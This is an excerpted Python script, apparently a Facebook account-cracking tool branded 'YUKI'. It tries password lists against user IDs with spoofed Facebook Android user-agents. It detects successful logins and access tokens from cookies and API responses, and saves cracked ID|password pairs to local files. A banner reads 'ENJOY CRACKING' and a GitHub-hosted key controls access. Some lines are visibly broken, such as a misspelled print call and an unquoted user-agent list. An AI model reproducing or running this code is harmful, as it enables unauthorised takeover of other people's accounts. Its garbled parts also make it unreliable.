...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[ YUKI ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ YUKI-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ YUKI-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ Yuki-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
...
\033[1;32mENJOY CRACKING🫡
\033[;33mCLEAR FACEBOOK DATA TO OPEN CP ID JUST NOW
\033[;32m===========================================
...
class Main:
	def __init__(self):
		...
		print(logo)
		print("")
		print("\033[1;36m FOLLOW ME ON FB!")
		print("")
		print("\033[1;32m [1] First You Folow me On Fb")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [ YUKI ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ Yuki-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-Yuki -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ CENT-OK ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("CENT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
	...
	def api(self, uid, pwx):
		rua = random.choice([FBAN/FB4A;FBAV/43.0.0.5777;FBBV/5819082;[FBAN/FB4A;FBAV/17.0.0.20.36;FBBV/537534996;FBDM/{density=2.3,width=1080,height=2160};FBLC/de_DE;FBRV/560347499;FB_FW/2;FBCR/VTR;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Note 7 Lite;FBSV/7.0;FBOP/19;FBCA/arm64-v8a:armeabi;;]
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/CenTsuPH/TsuLock/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
